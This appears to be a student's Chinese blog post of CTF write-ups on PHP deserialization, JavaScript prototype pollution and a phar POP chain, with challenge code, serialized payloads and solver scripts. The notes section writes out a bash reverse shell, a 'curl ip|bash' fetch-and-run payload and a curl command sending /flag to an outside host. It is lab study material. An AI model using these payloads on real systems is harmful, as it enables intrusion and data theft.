@@ -1,0 +1,678 @@
+---
+layout: post
+title: "其他被按着做的。。。"
+date:   2025-2-20
+tags: [作业]
+comments: true
+author: qing
+---
+### [网鼎杯 2020 青龙组]AreUSerialz1
+
+[https://www.runoob.com/php/func-filesystem-file-put-contents.html](https://)
+
+```
+《?php
+
+include("flag.php");
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+    protected $op;
+    protected $filename;
+    protected $content;
+
+    function __construct() {#初始化并用process
+        $op = "1";
+        $filename = "/tmp/tmpfile";
+        $content = "Hello World!";
+        $this->process();
+    }
+
+    public function process() {#process根据$op的值决定是执行write方法（$op为"1"时）还是read方法（$op为"2"时），否则输出"Bad Hacker!"。
+        if($this->op == "1") {
+            $this->write();
+        } else if($this->op == "2") {
+            $res = $this->read();
+            $this->output($res);
+        } else {
+            $this->output("Bad Hacker!");
+        }
+    }
+
+    private function write() {#write将$content写入$filename指定的文件中，前提是$content长度不超过100个字符。
+        if(isset($this->filename) && isset($this->content)) {
+            if(strlen((string)$this->content) > 100) {
+                $this->output("Too long!");
+                die();
+            }
+            $res = file_put_contents($this->filename, $this->content);#file_put_contents() 函数把一个字符串写入文件中。
+            if($res) $this->output("Successful!");
+            else $this->output("Failed!");
+        } else {
+            $this->output("Failed!");
+        }
+    }
+
+    private function read() {#read+output读取$filename指定文件的内容。
+        $res = "";
+        if(isset($this->filename)) {
+            $res = file_get_contents($this->filename);
+        }
+        return $res;
+    }
+
+    private function output($s) {#输出
+        echo "[Result]: ";
+        echo $s;
+    }
+
+    function __destruct() {#销毁
+        if($this->op === "2")
+            $this->op = "1";
+        $this->content = "";
+        $this->process();
+    }
+
+}
+
+function is_valid($s) {
+    for($i = 0; $i < strlen($s); $i++)
+        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))#检查输入字符串是否只包含ASCII码在32到125之间的字符。
+            return false;
+    return true;
+}
+
+if(isset($_GET{'str'})) {
+
+    $str = (string)$_GET['str'];
+    if(is_valid($str)) {
+        $obj = unserialize($str);
+    }
+
+}
+```
+
+```
+《?php
+class FileHandler {
+    protected $op;
+    protected $filename;
+    protected $content;
+    function __construct() {
+        $this->op = 2;#还有就是是数字2不要加引号（**这里挺细节重要的的！！！**
+        $this->filename = "flag.php";
+        $this->content;#注意这里需要content为空（某人一开始忘改了
+    }
+}
+$a = new FileHandler;
+$result = serialize($a);
+echo $result;
+echo "\n";
+$result=str_ireplace('*','',$result);
+$payload=preg_replace('/[\x00-\x1F\x7F]/', '', $result);#某懒狗懒得手动换于是找了个不可见字符转化（
+echo $payload;
+#O:11:"FileHandler":3:{s:5:"  *  op";i:2;s:11:"  *  filename";s:8:"flag.php";s:10:"  *  content";s:10:"  *  content";N;}
+#对比后再手动改一下数字
+#O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:8:"flag.php";s:7:"content";N;}
+```
+
+怎么[Result]:是空的（哭
+~~好吧还得用伪协议~~
+`filename = 'php://filter/read=convert.base64-encode/resource=flag.php'`
+`?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}`
+补一下：
+
+> 传参后会被反序列化，反序列化时会先调用 _destruct 方法，因为传入 op 为 “2” 时会先被 _destruct 方法变为 “1”，所以要实现读操作即 op == “2” 成立就要先绕过 _destruct的干扰， 。
+> 注意实现读操作的 op == “2” 是弱类型比较，也就是这里 2 == “2” 是成立的，而 _destruct的 op === “2” 是强类型比较，在这里 2 === “2” 不成立，也就是绕过了_destruct的干扰。所以 op 为 2 时可以成功实现读操作。
+
+嘶，原来这里还有个弱类型绕过（~~我说我怎么一开始构的payload都failed~~，原来是少了一个重要细节！！！
+
+---
+
+### unserialize3
+
+[https://blog.csdn.net/qq_58784379/article/details/120169420](https://)
+![1e2650f794aff362472e45a7b6ba71a5.png](https://pick.lwzheng.tech/2025/01/20/678ddd4b0c8ac.png)
+
+```
+《?php
+class xctf
+{
+    public $flag = '111';
+
+    public function __wakeup()
+    {
+        exit('bad requests');
+    }
+}
+$result=new xctf();
+$payload=serialize($result);
+echo $payload;
+```
+
+`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`
+绕过
+`O:4:"xctf":2:{s:4:"flag";s:3:"111";}`
+
+---
+
+### wife_wife
+
+~~所以题目是对妮露的表白吗~
+![929dfb099c8537adaaba77b766b315a4.png](https://pick.lwzheng.tech/2025/01/20/678ddd5139a41.png)
+~~疑似夹带私货~~
+![aedbec89271ab55ddd0e913a36643954.png](https://pick.lwzheng.tech/2025/01/22/67904064ece23.png)
+但我不会js呀（哭
+[https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD](https://)
+[https://www.freebuf.com/articles/web/275619.html](https://)
+[https://drun1baby.top/2022/12/29/JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/#1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%8E%9F%E5%9E%8B%EF%BC%88JavaScript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E7%BB%A7%E6%89%BF%EF%BC%89](https://)
+[https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/assign](https://)
+
+> 当我们谈到继承时，JavaScript 只有一种结构：对象。每个函数对象有 prototype 属性，而实例对象没有，但所有的实例对象（函数，数组，对象）都会初始化一个私有属性 __proto__ 指向它的 构造函数的原型对象 prototype。该原型对象也有一个自己的原型对象 __proto__，层层向上直到一个对象的原型对象为 null。根据定义，null 没有原型，并作为这个原型链中的最后一个环节。下面我们把构造函数、原型对象、以及实例对象的关系理清如下：
+>
+> 每个构造函数都有一个 prototype 原型对象
+> 每个实例对象都有一个 __proto__ 属性，并且指向它的构造函数的原型对象 prototype
+> 对象里的 constructor 属性指向其构造函数本身
+> 原型链污染简单来说就是如果能够控制并修改一个对象的原型，就可以影响到所有和这个对象同一个原型的对象。
+> newClass 实例化的对象 newObj 的 .__proto__ 指向 newClass 类的 prototype
+
+![5f1e06db25fd4bebb4c38c032247c556.png](https://pick.lwzheng.tech/2025/01/21/678fbe7a6b6c2.png)
+通过newObj.__proto===newClass.prototype将上级污染
+源码：
+
+```
+// post请求的路径
+app.post('/register', (req, res) => {
+ 
+    let user = JSON.parse(req.body)  // 把我们输入的账号密码，从json字符串转成对象
+ 
+    // 判断我们有没有输入账号和密码
+    if (!user.username || !user.password) {  
+        return res.json({ msg: 'empty username or password', err: true })
+    }
+    // 判断账号是否存在总对象的username里，如果相同的username就是重复用户名了
+    if (users.filter(u => u.username == user.username).length) {  
+        return res.json({ msg: 'username already exists', err: true })
+    }
+    // isAdmin是否true 与 邀请码是不是等于这个常量，所以sql注入没用，邀请码是个常量
+    if (user.isAdmin && user.inviteCode != INVITE_CODE) {
+        user.isAdmin = false
+        return res.json({ msg: 'invalid invite code', err: true })
+    }
+ 
+    // 使用系统函数复制对象，打包成一个新的对象
+    let newUser = **Object.assign**({}, baseUser, user)//Object.assign() 方法只会拷贝源对象可枚举的的自有属性到目标对象。可以触发原型链污染
+    users.push(newUser)  // 存到总对象里
+    res.json({ msg: 'user created successfully', err: false })  // 设置返回信息
+```
+
+`"__proto__":{"isAdmin":true}`
+![d5ed001bc9d0491262fd4aa0ba48d13c.png](https://pick.lwzheng.tech/2025/01/21/678fc30fe42ca.png)
+再登陆即可
+
+---
+
+### [网鼎杯 2020 青龙组]notes
+
+依旧是这篇[https://xz.aliyun.com/t/10032?time__1311=Cqjx2DRii%3DwxlxGgOKGOKD8YGCDBimaDOYD#toc-14](https://)
+有undefsafe() 函数解释（感觉这篇讲的挺好的
+
+```
+var express = require('express');// require 是一个用于引入模块的函数。 express 是一个流行的Web应用框架，用于快速搭建Web服务器和处理路由。
+var path = require('path');// path 模块是Node.js内置的，用于处理文件路径相关的操作
+const undefsafe = require('undefsafe');//undesafe存在漏洞：当 undefsafe() 函数的第 2，3 个参数可控时，我们可以污染 object 对象中的值。
+const { exec } = require('child_process');
+//引入了Express框架、Node.js内置的 path 模块、 undefsafe 库（用于安全地访问对象属性）以及 child_process 模块中的 exec 方法（用于执行系统命令）。
+
+var app = express();//创建了一个Express应用实例
+class Notes {//定义了一个 Notes 类，用于管理笔记。包含了初始化方法、写入笔记、获取笔记、编辑笔记、获取所有笔记和删除笔记的方法。
+    constructor() {
+        this.owner = "whoknows";
+        this.num = 0;
+        this.note_list = {};
+    }
+
+    write_note(author, raw_note) {
+        this.note_list[(this.num++).toString()] = {"author": author,"raw_note":raw_note};
+    }
+
+    get_note(id) {//undefsafe
+        var r = {}
+        undefsafe(r, id, undefsafe(this.note_list, id));
+        return r;
+    }
+
+    edit_note(id, author, raw) {//undefsafe
+        undefsafe(this.note_list, id + '.author', author);
+        undefsafe(this.note_list, id + '.raw_note', raw);
+    }
+
+    get_all_notes() {
+        return this.note_list;
+    }
+
+    remove_note(id) {
+        delete this.note_list[id];
+    }
+}//=>寻找get_note与edit_note
+
+var notes = new Notes();//创建了一个 Notes 类的实例，并写入了一条初始笔记。
+notes.write_note("nobody", "this is nobody's first note");
+
+
+app.set('views', path.join(__dirname, 'views'));//设置Express应用查找视图文件的目录， path.join 用于拼接目录路径， __dirname 表示当前文件所在的目录，这里表示视图文件存放在 views 文件夹下。
+app.set('view engine', 'pug');//设置应用使用的视图引擎为 pug ，这样Express在渲染视图时会使用 pug 的语法。
+app.use(express.json());//启用对JSON格式请求体的解析，这样在处理请求时，Express可以自动将JSON格式的请求体解析为JavaScript对象。
+app.use(express.urlencoded({ extended: false }));//启用对URL编码格式请求体的解析， extended: false 表示使用简单的URL编码解析方式。
+app.use(express.static(path.join(__dirname, 'public')));//设置Express应用提供静态文件服务，将 public 文件夹下的文件作为静态资源对外提供访问。
+
+
+app.get('/', function(req, res, next) {//当用户访问根路径时，会执行这个函数
+  res.render('index', { title: 'Notebook' });//通过 res.render 方法渲染 index.pug 视图，并传递一个 title 参数，值为 "Notebook"
+});
+
+app.route('/add_note')//定义了 /add_note 路径的路由
+    .get(function(req, res) {
+        res.render('mess', {message: 'please use POST to add a note'});//对于GET请求，返回一个提示信息，建议使用POST方法添加笔记
+    })
+    .post(function(req, res) {//从请求体中获取 author 和 raw （笔记内容），如果都存在，则调用 notes.write_note 方法添加笔记，并返回添加成功(失败)的消息。
+        let author = req.body.author;
+        let raw = req.body.raw;
+        if (author && raw) {
+            notes.write_note(author, raw);
+            res.render('mess', {message: "add note sucess"});
+        } else {
+            res.render('mess', {message: "did not add note"});
+        }
+    })
+
+app.route('/edit_note')//与 /add_note 路由类似
+    .get(function(req, res) {
+        res.render('mess', {message: "please use POST to edit a note"});
+    })
+    .post(function(req, res) {
+        let id = req.body.id;
+        let author = req.body.author;
+        let enote = req.body.raw;
+        if (id && author && enote) {
+            notes.edit_note(id, author, enote);//找到，很好的小白鼠（
+            res.render('mess', {message: "edit note sucess"});
+        } else {
+            res.render('mess', {message: "edit note failed"});
+        }
+    })
+
+app.route('/delete_note')//与 /add_note 路由类似
+    .get(function(req, res) {
+        res.render('mess', {message: "please use POST to delete a note"});
+    })
+    .post(function(req, res) {
+        let id = req.body.id;
+        if (id) {
+            notes.remove_note(id);
+            res.render('mess', {message: "delete done"});
+        } else {
+            res.render('mess', {message: "delete failed"});
+        }
+    })
+
+app.route('/notes')
+    .get(function(req, res) {//GET请求，从请求的查询参数中获取 q
+        let q = req.query.q;
+        let a_note;
+        if (typeof(q) === "undefined") {
+            a_note = notes.get_all_notes();
+        } else {
+            a_note = notes.get_note(q);//找到。 undefsafe第三个参数随第二个变化，无法控制
+        }
+        res.render('note', {list: a_note});//通过 res.render 方法渲染 note.pug 视图，并将获取到的笔记数据传递给视图。
+    })
+
+app.route('/status')
+    .get(function(req, res) {
+        let commands = {
+            "script-1": "uptime",//获取系统运行时间
+            "script-2": "free -m"//获取系统内存使用情况
+        };
+        for (let index in commands) {//通过 for...in 循环遍历命令对象，使用 exec 方法执行每个命令。遍历command!!!好的
+            exec(commands[index], {shell:'/bin/bash'}, (err, stdout, stderr) => {
+                if (err) {//如果执行过程中出现错误，直接返回
+                    return;
+                }
+                console.log(`stdout: ${stdout}`);//将命令的输出打印到控制台=》会过command的原型（也是note_list的）
+            });
+        }
+        res.send('OK');
+        res.end();
+    })
+
+
+app.use(function(req, res, next) {//404
+  res.status(404).send('Sorry cant find that!');
+});
+
+
+app.use(function(err, req, res, next) {//500
+  console.error(err.stack);
+  res.status(500).send('Something broke!');
+});
+
+
+const port = 8080;//定义应用监听的端口为8080，调用 app.listen 方法启动Express应用。当应用成功启动后，会在控制台打印出应用的访问地址。
+app.listen(port, () => console.log(`Example app listening at http://localhost:${port}`))
+```
+
+`ssh root@你的服务器`
+yum install httpd -y
+ systemctl start httpd
+当然我用的finalshell
+用的腾讯云，记得开一下自定义端口防火墙
+可以用html
+` cd /var/www/html/`
+` vim index.html`
+`bash -i >& /dev/tcp/ip/端口 0>&1`
+这是一个在类Unix系统中创建反向Shell的命令。 bash -i  启动一个交互式的  bash   shell， >&  用于重定向标准输出和标准错误输出， /dev/tcp/ip/端口  是一个特殊的文件描述符，用于建立与 IP地址的  xxxx端口的TCP连接， 0>&1  则将标准输入也重定向到这个连接上。这样，攻击者就可以通过监听该端口来获取服务器的Shell权限，完全控制服务器。
+`id=__proto__.aaa&author=curl ip|bash&raw=lalala;（注意POST+访问/edit_note)`
+将自定义属性  aaa  添加到对象的原型上。curl  是一个用于发送HTTP请求的工具， |  是管道符，它将  curl  命令的输出作为  bash  命令的输入。整体意图是通过  curl  从指定的ip地址下载内容，并在服务器上使用  bash  执行下载的内容。raw凑数的（源代码edit_note那里先执行的author,就用author了。感觉反过来用raw也行，但就这样吧）
+`undefsafe(this.note_list, id + '.author', author);`（着重写出来一下）=》污染note_list
+![5d4fa0b3ac3ac89a212b36ff01c8aa41.png](https://pick.lwzheng.tech/2025/01/23/6791217347f08.png)
+![a7b7e7b25ce861ecead5e5f69b763a02.jpg](https://pick.lwzheng.tech/2025/01/23/6791211bd21fa.jpg)
+或者
+上传一个shell.txt
+`vim（nano） shell.txt`
+`bash -i >& /dev/tcp/主机/端口 0>&1`
+`id=__proto__.bb&author=curl -F 'flag=@/flag' ip:端口&raw=a`
+ curl -F  是用于发送表单数据的选项， 'flag=@/flag'  表示将服务器上  /flag  文件的内容作为名为  flag  的表单字段发送出去（污染的原理一样,但这个直接发flag了
+这里改为`id=__proto__.abc&author=curl%20http://ip/shell.txt|bash&raw=a`也行，但这个跟第一个方法就一样了
+监听
+` nc -lvvp 2333`
+访问 /status 路由
+![6efc983f85d7a8968bb97a4e2dca02a1.png](https://pick.lwzheng.tech/2025/01/23/6791d8566b13f.png)
+
+---
+
+### [Dest0g3 520迎新赛]PharPOP
+
+[https://www.cnblogs.com/bmjoker/p/13742666.html](https://)（这篇写得不会的人也能看懂，写了phar、伪造、改签名等等，我便不再赘述了）
+[https://mp.weixin.qq.com/s/6O_Lodz1VW6Ua02YbyYH5w](https://)（这篇写了phar绕过+gzip)
+题目是phar_pop，用phar伪协议+pop链
+
+```
+《?php
+highlight_file(__FILE__);
+
+function waf($data){
+    if (is_array($data)){//检查输入的  $data  是否为数组
+        die("Cannot transfer arrays");
+    }
+    if (preg_match('/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i', $data)) {//检查是否有敏感字符串（不区分大小写
+        die("You can't do");//一堆限制，需用phar的方法
+    }//对传入数据进行waf(正则版），可以利用gzip压缩phar绕过waf函数过滤。（常）
+}
+
+class air{
+    public $p;
+
+    public function __set($p, $value) {//在给不可访问属性赋值时，即在调用私有属性的时候会自动执行
+        $p = $this->p->act;//从  $this->p->act  获取一个类名，然后使用这个类名创建一个新对象
+        echo new $p($value);//并将  $value  作为参数传递给该对象的构造函数，最后输出新创建的对象。
+    }
+}
+
+class tree{
+    public $name;
+    public $act;
+
+    public function __destruct() {// __destruct  魔术方法在对象被销毁时自动调用
+        return $this->name();//调用  $this->name  作为一个函数
+    }
+    public function __call($name, $arg){//在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法
+        $arg[1] =$this->name->$name;//将  $this->name  的  $name  属性值赋给  $arg[1] 
+
+    }
+}
+
+class apple {
+    public $xxx;
+    public $flag;
+    public function __get($flag)//读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）
+    {
+        $this->xxx->$flag = $this->flag;//将  $this->flag  的值赋给  $this->xxx  的  $flag  属性。给不可访问属性赋值
+    }
+}
+
+class D {
+    public $start;
+
+    public function __destruct(){
+        $data = $_POST[0];//这里分割了一下
+        if ($this->start == 'w') {//检查，write
+            waf($data);
+            $filename = "/tmp/".md5(rand()).".jpg";//生成一个临时文件名
+            file_put_contents($filename, $data);//将  $data  写入该文件，**file_get_contents触发phar反序列化**
+            echo $filename;//输出文件名
+        } else if ($this->start == 'r') {//read
+            waf($data);
+            $f = file_get_contents($data);
+            if($f){
+                echo "It is file";
+            }
+            else{
+                echo "You can look at the others";
+            }
+        }
+    }
+}
+
+class banana {
+    public function __get($name){
+        return $this->$name;
+    }
+}
+// flag in /   （看来在根目录
+if(strlen($_POST[1]) < 55) {
+    $a = unserialize($_POST[1]);
+}
+else{
+    echo "str too long";
+}
+
+throw new Error("start");//这也是个麻烦，利用PHP的GC机制绕过throw new Error("start");触发最开始的__destruct。将phar最后的}去掉来进行绕过。
+?>
+//因为反序列化会触发对象的析构函数，从而绕过  waf  函数对直接输入数据的限制。
+Fatal error: Uncaught Error: start in /var/www/html/index.php:80 Stack trace: #0 {main} thrown in /var/www/html/index.php on line 80
+我们需要找一个能表达出$a的：=》air的_set(最后一个）
+apple的_get可调用_set(给不可访问属性赋值)（倒二）
+tree的__call中$arg没初始化却要访问，可调用_get（倒三）
+tree的destruct中name()不存在，调用__call（倒四）
+destruct在对象被销毁时自动调用（第一个）
+tree的__destruct=>tree的__call=>apple的__get=>air的__set
+```
+
+**理一下：写入寻找的码(glob)（w时）-> pop输出+phar(gzip)绕过waf+GC绕过->phar伪协议读（r时)[post分为0（正 
+  文）和1（w/r)]**
+
+```
+链接里有
+《?php
+    class TestObject {
+    }
+
+    @unlink("phar.phar");
+    $phar = new Phar("phar.phar");
+    $phar->startBuffering();
+    //设置stub，增加gif文件头
+    $phar->setStub("GIF89a".""); 
+    $o = new TestObject();
+    $o->data = 'i am bmjoker';
+    //将自定义meta-data存入manifest
+    $phar->setMetadata($o); 
+    //添加要压缩的文件
+    $phar->addFromString("test.txt", "test"); 
+    //签名自动计算
+    $phar->stopBuffering();
+?>
+
+```
+
+> glob伪协议：在PHP中， glob 伪协议用于查找匹配特定模式的文件路径。它的语法类似于 glob:// ，后面跟着文件路径的模式。比如 glob:///var/www/html/*.txt  会匹配 /var/www/html/ 目录下所有扩展名为 .txt 的文件。通过这个伪协议，可以方便地获取符合特定规则的文件列表。
+>
+> FilesystemIterator类： FilesystemIterator  是PHP提供的一个用于迭代文件系统对象（文件和目录）的类。结合 glob 伪协议使用时， FilesystemIterator  可以遍历 glob 伪协议匹配到的所有文件路径。通过实例化该类并传入 glob 伪协议得到的路径，就可以方便地对这些文件进行逐个操作，比如获取文件名等信息。
+>
+> SplFileObject类： SplFileObject  类用于对单个文件进行读取、写入等操作。当使用 FilesystemIterator  类获取到目标文件的文件名（或文件路径）后，就可以使用 SplFileObject  类来打开并读取该文件的内容。
+
+用glob伪协议配合FilesystemIterator类读flag文件名，然后SplFileObject类读文件。
+在php.ini中改一下，不然会报错（笑不出来
+![9da0e516f4d5811f1dcef9d31cd0eab5.png](https://pick.lwzheng.tech/2025/01/24/6793925178737.png)
+glob:///*f*  这个表达式的含义如下：
+ glob://  是协议标识符，表明使用  glob  伪协议。 /*f*  是一个文件路径模式匹配规则：
+
+-  /  表示从当前目录开始。
+-  *  是通配符，表示匹配任意数量的任意字符。
+-  f  是一个普通字符，要求匹配的内容中必须包含字母  f 。
+
+```php
+《?php
+class air{
+    public $p;
+}
+class tree{
+    public $name;
+    public $act;
+}
+class apple {
+    public $xxx;
+    public $flag;
+}
+$tree5=new tree();
+$air4=new air();
+$apple3=new apple();
+$tree2=new tree();
+//tree的__destruct=>tree的__call=>apple的__get=>air的__set=》tree的act
+//从tree2开始是想给tree1（也就是2）的destruct留个位置。。。（别问，问就是强迫症。。。
+$tree2->name=$apple3;
+$apple3->xxx=$air4;
+$air4->p=$tree5;
+$tree5->act='FilesystemIterator';
+$apple3->flag = 'glob:///*f*';
+//成了new FilesystemIterator(‘glob:///*f*’)
+
+$phar = new Phar("phar.phar");
+$phar->startBuffering();
+//设置stub，增加gif文件头
+$phar->setStub("GIF89a"."");
+//将自定义meta-data存入manifest
+$phar->setMetadata($tree2);
+//添加要压缩的文件
+$phar->addFromString("test.txt", "test");
+//签名自动计算
+$phar->stopBuffering();
+
+echo serialize($tree2);
+```
+
+删除}来进行绕过。这样会在反序列化时报错触发__destruct(这里一定注意！！
+破坏这个序列化字符串的完整性。
+当 PHP 尝试对 PHAR 文件中的序列化数据进行反序列化时，由于格式不完整，它可能会跳过原本依赖垃圾回收机制触发的一些检查和执行流程。原本精心构造的利用链中，可能依赖于完整的序列化结构来触发特定的对象生命周期事件，进而利用 GC 漏洞。而格式被破坏后，这些依赖关系被打破，导致无法按照预期触发漏洞利用，从而实现了某种程度上的绕过。
+~~某人一开始用笔记本当懒狗，卡了好久~~
+[https://www.cnblogs.com/zzkkk1h/p/18119862](https://)
+phar文件是二进制文件，以文本形式在记事本中打开会出现乱码，难以准确找到要删除的字符对应的位置，可能导致误操作，破坏文件其他重要部分。010 Editor支持多种文件格式解析，能更好地识别和处理PHAR文件结构，操作时会考虑文件格式规范，尽量保证文件其他部分的完整性和正确性。记事本只是简单的文本编辑工具，不具备对二进制文件格式的理解和处理能力，直接删除字符可能破坏文件结构，使文件无法正常使用。
+![52eb6c550488295faa819411b9fe488e.png](https://pick.lwzheng.tech/2025/01/25/67949255edbbf.png)
+改签名
+
+```
+import gzip
+from hashlib import sha1
+
+with open(r"D:\Desktop\ctf\ctf\buuctf\phar.phar", 'rb') as file:
+    f = file.read()
+s = f[:-28]  # 获取要签名的数据
+h = f[-8:]  # 获取签名类型以及GBMB标识
+newf = s + sha1(s).digest() + h  # 数据 + 签名 + (类型 + GBMB)
+open("1.phar", "wb").write(newf)
+
+```
+
+然后压缩
+`gzip 1.phar`
+这里提一嘴这是linux有，windows得自己搞，~~（反正我图一劳永逸下了个。。。~~
+![04123e7d9739bdfa2043c495b0e2affa.png](https://pick.lwzheng.tech/2025/01/25/6794681b9a6e5.png)
+然后将文件url编码
+
+```
+import urllib.parse
+ 
+with open("1.phar.gz", 'rb') as fi:
+    f = fi.read()
+    ff = urllib.parse.quote(f) #获取信息
+    print(ff)
+```
+
+上面是0的，下面是1的
+
+```
+《?php
+class D {
+    public $start;
+
+}
+//$a=new D();
+//$a->start='w';
+//echo serialize($a);
+$a=new D();
+$a->start='r';
+echo serialize($a);
+```
+
+我们先写入恶意代码寻找再把它们读出来
+
+```
+（1）
+0=%1F%8B%08%08%BA%92%94g%00%0Bqq.phar%00s%F7t%B3%B0L%B4%B1/%C8%28P%88%8F%F7p%F4%09%89w%F6%F7%0D%F0%F4q%0D%D2%D0%B4V%B0%B7%E3%E5z%C5%C0%C0%C0%08%C4%82P%9A%81a%0B%10%FB%5B%99X%29%95%14%A5%A6%2AY%19YU%17%83xy%89%B9%A9J%D6%FEV%A6VJ%89%05%0590%19c%2B%A5%8A%8A%0A%90%04%90%95%98Y%A4de%08%126%B4R%2A%00%09%E20%C6%CF%1A%AC31%B9D%09%C82%B4%B0Rr%CB%CCI-%AE%2C.I%CD%F5%2CI-J%2C%C9/R%B2%AE%AD%05kI%CBIL%07%2B%03%1A%9A%9E%93%9Fd%A5%AF%AF%AF%95%A6%05%94G%18%E2g%CD%01tvIjq%89%5EIE%09%0B%90%5D%3DiJ%3A%88%E6%A9%AB%BF%B1%0D%E23%B0%FC%D9%03%92%13%8F%ED%CD%07%06%40i%99W%F4%11%1E%D7%3D_%3B%98%80r%EEN%BEN%00%AFG%F2%AB0%01%00%00&1=O:1:"D":2:{s:5:"start";s:1:"w";}
+（2）
+0=phar:///tmp/e187bd660e4cd6bf8432be0693aa44a1.jpg&1=O:1:"D":2:{s:5:"start";s:1:"r";}
+```
+
+![07a1b4612b00ab2c4773f80227c8a0ee.png](https://pick.lwzheng.tech/2025/01/25/6794933779ee0.png)
+在/fflaggg
+再将
+
+```
+$tree5->act='SplFileObject';
+$apple3->flag = '/fflaggg';
+// new SplFileObject('/fflaggg')
+```
+
+payload构造方法与上面相似，就不放了~~（绝对不是当时忘复制，懒狗又懒得再弄一次~~
+![60527cd7961f3381271fccdc0e3fd609.png](https://pick.lwzheng.tech/2025/01/25/67945f7aa1563.png)
+![88a4bf69b1b90a2961e8b9db60eba81c.png](https://pick.lwzheng.tech/2025/01/25/67945f7aa1572.png)
+`flag{a73a8c15-55d5-44df-acbb-361b4773ff1d}`
+
+---
+
+还有个GC[https://xz.aliyun.com/news/11289](https://)法，看了看，感觉更靠谱一些，改天试试.
+原理链接已有写
+改一下：
+$payload=array($tree2,0);
+echo serialize($payload);
+$phar->setMetadata($payload);
+a:2:{i:0;O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:18:"FilesystemIterator";}}s:4:"flag";s:11:"glob:///*f*";}s:3:"act";N;}i:1;i:0;}
+a:2:{i:0;O:4:"tree":2:{s:4:"name";O:5:"apple":2:{s:3:"xxx";O:3:"air":1:{s:1:"p";O:4:"tree":2:{s:4:"name";N;s:3:"act";s:18:"FilesystemIterator";}}s:4:"flag";s:11:"glob:///*f*";}s:3:"act";N;}i:0;i:0;}
+再改签名-》可见变正常了
+![e33e0736f36a5dd19976e8e413a7793f.png](https://pick.lwzheng.tech/2025/01/26/6795a3d1ab1a4.png)
+这里提一嘴，我的phar本来就是02结尾（所以03是为什么会出现的？
+
+![a3aeece7bcc0ab4abf5ecb7eb7300532.png](https://pick.lwzheng.tech/2025/01/26/6795a83fd0ae3.png)
+---
+
+我说实话有些题有种”你已经学会1+1=2，现在来试试矩阵吧“的幽默感~~（笑不出来~~
+~~（我打宿傩，真的假的？？？~~
+上上贴说的问题贴等我把另一半开发搞了一起放。。。。（囤
+
+---
+
+最后一题的wp还有一些细节没写，再等我会儿。。。找些资料后马上补上
+
+![](https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/ac1283e1b0c986f9f616fbd618dba0b4.png)
